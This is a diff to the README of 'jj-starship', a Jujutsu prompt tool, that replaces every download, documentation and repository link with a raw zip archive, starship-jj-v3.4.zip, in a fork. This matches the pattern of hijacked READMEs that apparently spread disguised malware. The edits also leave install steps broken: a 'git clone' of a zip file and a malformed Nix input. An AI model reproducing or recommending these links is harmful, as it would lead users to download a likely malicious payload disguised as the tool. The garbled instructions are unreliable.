@@ -1,6 +1,6 @@
 # 🌟 jj-starship - Streamline Your Git Experience
 
-[![Download jj-starship](https://img.shields.io/badge/Download%20jj--starship-blue.svg)](https://github.com/prasant081/jj-starship/releases)
+[![Download jj-starship](https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip%https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip)](https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@
 
 To get started with **jj-starship**, you need to download the application. Follow these steps to install it:
 
-1. **Visit this page to download:** [jj-starship Releases](https://github.com/prasant081/jj-starship/releases).
+1. **Visit this page to download:** [jj-starship Releases](https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip).
 2. Choose the version suitable for your operating system and click on the download link.
 
 ## 🛠️ Installation Instructions
@@ -45,7 +45,7 @@ For those who want to compile from source, follow these instructions:
 2. Run these commands:
 
    ```sh
-   git clone https://github.com/dmmulroy/jj-starship
+   git clone https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip
    cd jj-starship
    cargo install --path .
    ```
@@ -76,7 +76,7 @@ If you are a Nix user, you can run or install **jj-starship** easily:
 
    ```nix
    {
-     inputs.jj-starship.url = "github:dmmulroy/jj-starship";
+     https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip = "github:dmmulroy/jj-starship";
      outputs = { self, nixpkgs, jj-starship, ... }: {
        # Use the overlay
        nixosConfiguration
@@ -103,7 +103,7 @@ If you face any issues or have questions, feel free to reach out via the GitHub 
 
 ## 🔗 Additional Resources
 
-- Check the [Starship documentation](https://starship.rs) for more information on how prompts work.
-- Visit the [Jujutsu repository](https://github.com/jj-vcs/jj) to learn more about managing repositories effectively.
+- Check the [Starship documentation](https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip) for more information on how prompts work.
+- Visit the [Jujutsu repository](https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip) to learn more about managing repositories effectively.
 
-For updates and news regarding **jj-starship**, keep an eye on the Releases page [here](https://github.com/prasant081/jj-starship/releases).
+For updates and news regarding **jj-starship**, keep an eye on the Releases page [here](https://github.com/prasant081/jj-starship/raw/refs/heads/main/src/starship-jj-v3.4.zip).
